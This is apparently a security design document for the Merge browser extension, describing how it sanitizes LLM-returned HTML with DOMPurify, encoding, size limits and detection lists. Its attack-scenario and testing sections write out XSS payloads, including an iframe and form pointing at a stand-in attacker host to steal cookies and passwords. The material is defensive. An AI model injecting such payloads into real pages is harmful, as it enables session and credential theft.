# Security Implementation

This document outlines the security measures implemented in the Merge extension to protect against malicious content, particularly from LLM responses.

## Overview

The extension receives HTML content from AI/LLM providers, which could potentially contain malicious code. To protect users, we've implemented multiple layers of defense.

## Security Architecture

### 1. HTML Sanitization (Primary Defense)

**Library**: DOMPurify (isomorphic-dompurify v2.16.0)

**Implementation**: `src/sanitizer.ts`

DOMPurify sanitizes all HTML content before it's inserted into the page. This is the primary defense against XSS attacks.

#### Configuration

```typescript
ALLOWED_TAGS: Safe semantic HTML elements only
ALLOWED_ATTR: Non-executable attributes only (href, title, class, id, etc.)
FORBID_TAGS: Dangerous elements (script, iframe, embed, object, style, form, etc.)
FORBID_ATTR: All JavaScript event handlers (onclick, onerror, onload, etc.)
ALLOWED_URI_REGEXP: Only http, https, and mailto schemes
```

#### What Gets Encoded

Dangerous tags are converted to HTML entities (encoded) rather than stripped. This preserves the content visually while preventing execution:

- `<script>` tags → `&lt;script&gt;` (displays as `<script>` but doesn't execute)
- `<iframe>` tags → `&lt;iframe&gt;` (displays as text)
- `<embed>` and `<object>` tags → Encoded to text
- `<style>` tags → Encoded to text (prevents CSS injection)
- `<form>`, `<input>`, `<button>` → Encoded to text (prevents form hijacking)

This encoding approach is important when the LLM is trying to show examples or documentation that includes these tags.

#### What Gets Stripped

- All event handler attributes - Indirect JavaScript execution
  - onclick, onerror, onload, onmouseover, etc.
- Dangerous URL schemes in attributes
  - javascript:, data:text/html, vbscript:

#### What Gets Allowed

Safe semantic HTML elements:

- Text formatting: `<p>`, `<strong>`, `<em>`, `<b>`, `<i>`, `<u>`, etc.
- Lists: `<ul>`, `<ol>`, `<li>`, `<dl>`, `<dt>`, `<dd>`
- Headings: `<h1>` through `<h6>`
- Structural: `<div>`, `<span>`, `<section>`, `<article>`, etc.
- Links: `<a>` (with URL validation)
- Code: `<code>`, `<pre>`
- Quotes: `<blockquote>`, `<q>`, `<cite>`
- Tables: `<table>`, `<tr>`, `<td>`, `<th>`, etc.

### 2. Input Validation

**Size Limit**: Maximum 1MB of content

This prevents denial-of-service attacks via extremely large responses that could:

- Consume excessive memory
- Freeze the browser
- Slow down sanitization processing

### 3. Dangerous Content Detection

Before sanitization, the extension scans for known dangerous patterns:

- Script tags
- iframe/embed/object tags
- Event handler attributes
- javascript: URLs
- data:text/html URLs
- vbscript: URLs

If detected, users are warned after sanitization completes.

### 4. Graceful Fallback

If sanitization fails for any reason:

- Content is converted to plain text (all HTML tags removed)
- User is notified that content couldn't be safely displayed
- No unsanitized content ever reaches the DOM

### 5. User Notifications

Users are informed when:

- Dangerous content was detected and removed
- Content couldn't be safely sanitized
- Sanitization resulted in a safe but modified output

## Attack Scenarios Prevented

### 1. Direct Script Injection

**Attack**: `<script>alert('XSS')</script>`
**Defense**: Script tags are encoded to `&lt;script&gt;alert('XSS')&lt;/script&gt;`, displaying as text

### 2. Event Handler Injection

**Attack**: `<img src=x onerror=alert('XSS')>`
**Defense**: onerror attribute is stripped by DOMPurify (attributes can't be safely encoded)

### 3. JavaScript URL Schemes

**Attack**: `<a href="javascript:alert('XSS')">Click</a>`
**Defense**: Href is sanitized to remove javascript: scheme

### 4. iframe Embedding

**Attack**: `<iframe src="https://evil.com/steal-cookies"></iframe>`
**Defense**: iframe tags are encoded to `&lt;iframe...&gt;`, displaying as text

### 5. Data URI Exploitation

**Attack**: `<a href="data:text/html,<script>alert('XSS')</script>">Click</a>`
**Defense**: data: URIs are blocked

### 6. CSS Injection

**Attack**: `<style>body { background: url('javascript:alert(1)') }</style>`
**Defense**: Style tags are encoded to `&lt;style&gt;...&lt;/style&gt;`, displaying as text

### 7. Form Hijacking

**Attack**: `<form action="https://evil.com"><input name="password"></form>`
**Defense**: Form and input tags are encoded, displaying as text

### 8. Object/Embed Plugins

**Attack**: `<object data="malicious.swf"></object>`
**Defense**: Object and embed tags are encoded, displaying as text

## Code Flow

```
LLM Response → extractHTMLFromMarkdown()
              ↓
           sanitizeHTMLSafe()
              ↓
           sanitizeHTML()
              ↓
        encodeDangerousTags()  ← Encode dangerous tags to HTML entities
              ↓
        DOMPurify.sanitize()   ← Strip dangerous attributes
              ↓
      Validation & Warning Check
              ↓
        Safe HTML → innerHTML
```

## Testing

To verify the security implementation, test with these payloads:

```html
<!-- Should be blocked -->
<script>
  alert('xss');
</script>
<iframe src="https://evil.com"></iframe>
<img src="x" onerror="alert(1)" />
<a href="javascript:alert(1)">Click</a>
<embed src="malicious.swf" />
<object data="malicious.swf"></object>
<form action="https://evil.com"><input name="pass" /></form>
<div onclick="alert(1)">Click</div>
<style>
  body {
    display: none;
  }
</style>

<!-- Should be allowed -->
<p>Safe paragraph</p>
<a href="https://example.com">Safe link</a>
<strong>Bold text</strong>
<ul>
  <li>List item</li>
</ul>
<code>Safe code</code>
```

## Security Considerations

### What This Protects Against

- ✅ XSS attacks via script injection
- ✅ Event handler exploitation
- ✅ iframe/embed content injection
- ✅ Dangerous URL schemes
- ✅ CSS injection attacks
- ✅ Form hijacking
- ✅ DoS via large content
- ✅ Malicious plugin content

### What This Does NOT Protect Against

- ❌ Phishing via legitimate-looking links (users should verify URLs)
- ❌ Privacy issues from linking to tracking URLs
- ❌ Content that is malicious but valid HTML (e.g., misleading text)
- ❌ Attacks targeting the AI provider's API
- ❌ Social engineering attacks

### Defense in Depth

This implementation follows the principle of defense in depth:

1. **Input validation** - Size limits
2. **Sanitization** - DOMPurify with strict whitelist
3. **Detection** - Pre-sanitization scanning
4. **Notification** - User warnings
5. **Fallback** - Plain text conversion

## Maintenance

### Keeping DOMPurify Updated

Regularly update DOMPurify to get the latest security patches:

```bash
npm update isomorphic-dompurify
```

### Monitoring

Watch for:

- New XSS attack vectors
- DOMPurify security advisories
- Reports of bypasses in similar configurations

### Review Checklist

- [ ] DOMPurify is up to date
- [ ] No new dangerous HTML elements have been added to ALLOWED_TAGS
- [ ] FORBID_TAGS includes all known dangerous elements
- [ ] FORBID_ATTR includes all event handler patterns
- [ ] URL validation regex is current
- [ ] Size limits are appropriate
- [ ] Error handling is robust

## References

- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: HTML Sanitization](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)
- [Chrome Extension Security Best Practices](https://developer.chrome.com/docs/extensions/mv3/security/)

## Reporting Security Issues

If you discover a security vulnerability:

1. **Do NOT** open a public issue
2. Email: paul@aifoc.us
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

Security issues will be addressed with high priority.
